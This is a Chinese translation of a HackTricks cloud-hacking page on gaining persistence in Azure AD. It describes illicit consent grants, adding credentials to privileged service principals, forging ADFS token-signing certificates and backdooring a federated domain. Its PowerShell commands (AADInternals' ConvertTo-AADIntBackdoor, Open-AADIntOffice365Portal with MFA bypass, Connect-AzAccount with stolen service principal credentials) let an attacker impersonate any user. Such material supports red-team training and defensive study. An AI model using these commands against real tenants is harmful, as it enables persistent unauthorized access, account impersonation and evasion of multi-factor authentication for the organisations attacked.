# Az - 持久性

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

- 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
- 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
- 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
- **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**。**
- 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

### 非法同意授予

默认情况下，任何用户都可以在Azure AD中注册应用程序。因此，您可以注册一个应用程序（仅适用于目标租户），该应用程序需要管理员同意高影响权限（如果您是管理员，则可以批准）- 如代表用户发送邮件，角色管理等。这将使我们能够在成功的情况下执行**钓鱼攻击**，这将非常**有成效**。

此外，您还可以接受该应用程序，并以您的用户身份作为一种维持访问权限的方式。

### 应用程序和服务主体

具有应用程序管理员、GA或具有microsoft.directory/applications/credentials/update权限的自定义角色的权限，我们可以向现有应用程序添加凭据（密钥或证书）。

可以**针对具有高权限的应用程序**或**添加具有高权限的新应用程序**。

向应用程序添加的一个有趣的角色是**特权身份验证管理员角色**，因为它允许**重置全局管理员的密码**。

此技术还允许**绕过MFA**。

{% code overflow="wrap" %}
```powershell
$passwd = ConvertTo-SecureString "J~Q~QMt_qe4uDzg53MDD_jrj_Q3P.changed" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("311bf843-cc8b-459c-be24-6ed908458623", $passwd)
Connect-AzAccount -ServicePrincipal -Credential $credentials -Tenant e12984235-1035-452e-bd32-ab4d72639a
```
{% endcode %}

* 用于基于证书的身份验证

{% code overflow="wrap" %}
```powershell
Connect-AzAccount -ServicePrincipal -Tenant <TenantId> -CertificateThumbprint <Thumbprint> -ApplicationId <ApplicationId>
```
### 联合 - 令牌签名证书

拥有本地 AD 上的 **DA 特权**，可以创建和导入具有非常长有效期的 **新令牌签名** 和 **令牌解密证书**。这将允许我们以任何我们知道其 ImuutableID 的用户身份 **登录**。

作为 **ADFS 服务器上的 DA** 运行以下命令来创建新证书（默认密码为 'AADInternals'），将它们添加到 ADFS，禁用自动轮换并重新启动服务：
```powershell
New-AADIntADFSSelfSignedCertificates
```
然后，使用Azure AD更新证书信息：
```powershell
Update-AADIntADFSFederationSettings -Domain cyberranges.io
```
### 联合 - 受信任的域

拥有租户上的 GA 特权后，可以**添加一个新域**（必须经过验证），将其身份验证类型配置为联合，并配置该域**信任特定证书**（在下面的命令中为 any.sts）和发行者：
```powershell
# Using AADInternals
ConvertTo-AADIntBackdoor -DomainName cyberranges.io

# Get ImmutableID of the user that we want to impersonate. Using Msol module
Get-MsolUser | select userPrincipalName,ImmutableID

# Access any cloud app as the user
Open-AADIntOffice365Portal -ImmutableID qIMPTm2Q3kimHgg4KQyveA== -Issuer "http://any.sts/B231A11F" -UseBuiltInCertificate -ByPassMFA$true
```
## 参考资料

* [https://aadinternalsbackdoor.azurewebsites.net/](https://aadinternalsbackdoor.azurewebsites.net/)

<details>

<summary><strong>从零开始学习AWS黑客技术</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在HackTricks中看到您的**公司广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。 

</details>
